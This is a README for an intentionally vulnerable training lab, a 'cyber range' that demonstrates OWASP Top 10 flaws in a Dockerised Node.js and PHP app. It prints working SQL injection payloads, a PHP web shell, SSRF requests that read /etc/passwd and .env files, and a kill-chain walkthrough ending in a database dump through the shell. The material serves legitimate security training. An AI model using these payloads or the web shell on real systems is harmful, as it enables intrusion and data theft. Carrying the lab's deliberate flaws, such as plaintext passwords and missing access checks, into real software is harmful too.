# W Corp Cyber Range

A comprehensive cyber range environment designed to demonstrate OWASP Top 10 vulnerabilities and complete cyber kill chain attacks. This intentionally vulnerable application serves as an educational platform for security training and penetration testing.

## ⚠️ Security Warning

**This application contains intentional vulnerabilities for educational purposes only. Do not deploy in production environments or use real personal information.**

## 🏗️ Architecture

The cyber range consists of three main components:

- **Frontend:** React.js application with modern UI
- **Backend:** Node.js API server with intentional vulnerabilities
- **Legacy System:** PHP components with classic web vulnerabilities
- **Database:** MySQL database with sample data

## 🚀 Quick Start

### Prerequisites

- Docker and Docker Compose
- Git

### Installation

1. Clone the repository:
```bash
git clone <repository-url>
cd cyberrange
```

2. Start the environment:
```bash
docker-compose up -d
```

3. Access the applications:
- **Main Application:** http://localhost:3000
- **PHP Legacy System:** http://localhost:8080
- **Database:** localhost:3306

### Default Credentials

- **Admin:** admin / admin123
- **User:** john.doe / password123
- **User:** jane.smith / qwerty

## 🔍 OWASP Top 10 Vulnerabilities

### A01 - Broken Access Control (IDOR)

**Location:** `/api/user/profile/:id`, `/api/user/sensitive/:id`, `/api/user/notes/:id`

**Description:** No authorization checks allow any authenticated user to access any user's data.

**Exploitation:**
1. Login with any user account
2. Navigate to `/portal/profile/1` (admin profile)
3. Change the ID to access other users' profiles
4. Access sensitive data and internal notes

**Example:**
```bash
# Access admin profile as regular user
curl -H "Authorization: Bearer <token>" http://localhost:3000/api/user/profile/1

# Access sensitive data
curl -H "Authorization: Bearer <token>" http://localhost:3000/api/user/sensitive/1
```

### A02 - Cryptographic Failures

**Location:** User registration and authentication

**Description:** Passwords are stored in plain text without hashing or encryption.

**Exploitation:**
1. Register a new user or use existing credentials
2. Check the database to see plain text passwords
3. Use weak passwords to demonstrate the risk

**Database Query:**
```sql
SELECT username, password FROM users;
```

### A03 - Injection (SQL Injection)

**Location:** `http://localhost:8080/login.php`

**Description:** Raw SQL queries without prepared statements allow SQL injection.

**Exploitation:**
1. Navigate to `http://localhost:8080/login.php`
2. Use SQL injection payloads in the username field

**Payloads:**
```sql
# Bypass authentication
admin' OR '1'='1' --

# Extract user data
admin' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users --

# Extract database schema
admin' UNION SELECT table_name,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema='wcorp_db' --
```

### A05 - Security Misconfiguration

**Location:** Multiple endpoints

**Description:** Sensitive configuration files and information are exposed.

**Exploitation:**
1. Access exposed configuration files:
   - `http://localhost:3000/.env`
   - `http://localhost:3000/package.json`
   - `http://localhost:8080/info.php`

2. Check robots.txt and sitemap.xml for directory structure

**Example:**
```bash
curl http://localhost:3000/.env
curl http://localhost:3000/package.json
curl http://localhost:8080/info.php
```

### A07 - Identification and Authentication Failures

**Location:** Login endpoint and session management

**Description:** Predictable session tokens and no rate limiting on login attempts.

**Exploitation:**
1. Attempt multiple login failures (no rate limiting)
2. Check browser storage for predictable session tokens
3. Use predictable token patterns to hijack sessions

**Session Token Analysis:**
```javascript
// Check localStorage for predictable tokens
localStorage.getItem('token')
```

### A08 - Software and Data Integrity Failures

**Location:** `http://localhost:8080/upload.php`

**Description:** Unrestricted file upload without validation or scanning.

**Exploitation:**
1. Create a PHP web shell:
```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

2. Upload the web shell through the vulnerable form
3. Access the shell at `http://localhost:8080/uploads/shell.php?cmd=whoami`

### A10 - Server-Side Request Forgery (SSRF)

**Location:** `/api/fetch-url?url=`

**Description:** No URL validation allows internal network access.

**Exploitation:**
1. Use the SSRF endpoint to access internal resources:
```bash
curl "http://localhost:3000/api/fetch-url?url=http://localhost:3000/.env"
curl "http://localhost:3000/api/fetch-url?url=file:///etc/passwd"
```

2. Access internal services and files

## 🎯 Cyber Kill Chain Demonstration

### Complete Attack Scenario

1. **Reconnaissance**
   - Analyze robots.txt and sitemap.xml
   - Examine HTML source code comments
   - Identify vulnerable endpoints

2. **Weaponization**
   - Create SQL injection payloads
   - Develop PHP web shell
   - Prepare SSRF payloads

3. **Delivery**
   - Upload web shell through vulnerable form
   - Inject SQL through login form

4. **Exploitation**
   - Execute web shell commands
   - Extract data through SQL injection
   - Bypass authentication

5. **Installation**
   - Establish persistent access
   - Create additional backdoors

6. **Command & Control**
   - Use web shell for remote commands
   - Maintain persistent access

7. **Actions on Objectives**
   - Extract sensitive data
   - Perform database dumps
   - Access internal systems

### Step-by-Step Attack Flow

```bash
# 1. Reconnaissance
curl http://localhost:3000/robots.txt
curl http://localhost:3000/sitemap.xml

# 2. SQL Injection
curl -X POST http://localhost:8080/login.php \
  -d "username=admin' OR '1'='1' --&password=anything"

# 3. File Upload
curl -X POST http://localhost:8080/upload.php \
  -F "file=@shell.php"

# 4. Web Shell Execution
curl "http://localhost:8080/uploads/shell.php?cmd=whoami"

# 5. Data Exfiltration
curl "http://localhost:8080/uploads/shell.php?cmd=mysqldump -u wcorp_user -pwcorp_pass wcorp_db"
```

## 🛠️ Development

### Project Structure

```
cyberrange/
├── docker-compose.yml          # Container orchestration
├── Dockerfile.node            # Node.js container
├── Dockerfile.php             # PHP container
├── database/
│   └── init.sql              # Database initialization
├── frontend/                  # React application
│   ├── src/
│   │   ├── components/
│   │   ├── pages/
│   │   └── contexts/
│   └── public/
├── backend/                   # Node.js API
│   └── server.js
├── php/                      # PHP vulnerable components
│   ├── index.php
│   ├── login.php
│   ├── upload.php
│   └── info.php
└── uploads/                  # File upload directory
```

### Building from Source

1. **Frontend:**
```bash
cd frontend
npm install
npm run build
```

2. **Backend:**
```bash
cd backend
npm install
npm start
```

3. **PHP:**
```bash
# PHP files are served directly by Apache
```

### Database Schema

The database includes the following tables:
- `users` - User accounts and credentials
- `sessions` - Session management
- `files` - File upload tracking
- `sensitive_data` - Sensitive user information
- `internal_notes` - Internal company notes

## 🔒 Security Considerations

### For Educational Use Only

This cyber range is designed for:
- Security training and education
- Penetration testing practice
- Vulnerability assessment training
- Cyber kill chain demonstration

### Not for Production

Do not use this application in production environments because:
- All vulnerabilities are intentional
- No security controls are implemented
- Sensitive data is exposed
- No input validation exists

## 📚 Learning Objectives

After completing this cyber range, participants will understand:

1. **OWASP Top 10 Vulnerabilities**
   - How each vulnerability works
   - Common exploitation techniques
   - Impact and consequences

2. **Cyber Kill Chain**
   - Complete attack lifecycle
   - How vulnerabilities chain together
   - Attack progression and escalation

3. **Defense Strategies**
   - How to prevent each vulnerability
   - Security best practices
   - Defense in depth principles

## 🤝 Contributing

This cyber range is designed for educational purposes. Contributions that enhance the learning experience are welcome:

1. Fork the repository
2. Create a feature branch
3. Add new vulnerabilities or scenarios
4. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🆘 Support

For questions or issues:

1. Check the documentation
2. Review the cyber kill chain guide
3. Examine the source code
4. Create an issue for bugs or improvements

## 🔗 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Docker Documentation](https://docs.docker.com/)
- [React Documentation](https://reactjs.org/docs/)
- [Node.js Documentation](https://nodejs.org/docs/)

---

**Remember: This is a cyber range for educational purposes only. Use responsibly and never deploy in production environments.**
